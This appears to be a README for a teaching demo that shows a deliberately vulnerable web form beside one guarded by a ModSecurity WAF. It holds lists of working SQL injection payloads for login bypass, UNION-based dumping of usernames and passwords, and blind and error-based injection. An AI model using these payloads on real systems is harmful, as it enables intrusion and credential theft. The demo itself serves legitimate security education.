# SQL Injection Demo with ModSecurity WAF

## 🌐 Live Deployment URLs
- **Vulnerable (Exploitable)**: `http://3.108.221.71/vulnerable/page1.html`
- **Protected (Non-exploitable)**: `http://3.108.221.71/protected/page2.html`

## 🏗️ Architecture

Internet (Port 80) → Nginx Reverse Proxy → {
/vulnerable/* → Apache:8080 (No WAF Protection)
/protected/*  → Apache:8081 (ModSecurity WAF Enabled)
}

## 🚀 Quick Setup

### Prerequisites
- Ubuntu 22.04 LTS (EC2 Instance)
- Security Groups: Port 22 (SSH), Port 80 (HTTP)

### Installation
```bash
# 1. Clone repository
git clone https://github.com/YOUR_USERNAME/sqli-waf-demo.git
cd sqli-waf-demo

# 2. Run installation script
chmod +x install.sh
sudo ./install.sh

# 3. Access applications
# Vulnerable: http://your-server-ip/vulnerable/page1.html
# Protected: http://your-server-ip/protected/page2.html


🧪 Testing SQL Injection
Test on Vulnerable Form (Should Work ✅)
sqladmin' OR '1'='1
' UNION SELECT 1,username,password FROM users--
admin'--
'or'x'='x
admin' UNION SELECT 1,@@version,3--
Test on Protected Form (Should Be Blocked ❌)
Same payloads → Expected Result: 403 Forbidden Error
Additional Test Payloads
sql# Authentication Bypass
admin' OR 1=1--
'OR''='
admin' OR 2>1--

# Data Extraction  
' UNION SELECT 1,2,3--
' UNION SELECT 1,user(),database()--
admin' UNION SELECT 1,group_concat(username),group_concat(password) FROM users--

# Time-based Blind Injection
admin' AND (SELECT SLEEP(5))--
admin' AND IF(1=1,SLEEP(3),0)--

# Error-based Injection
admin' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--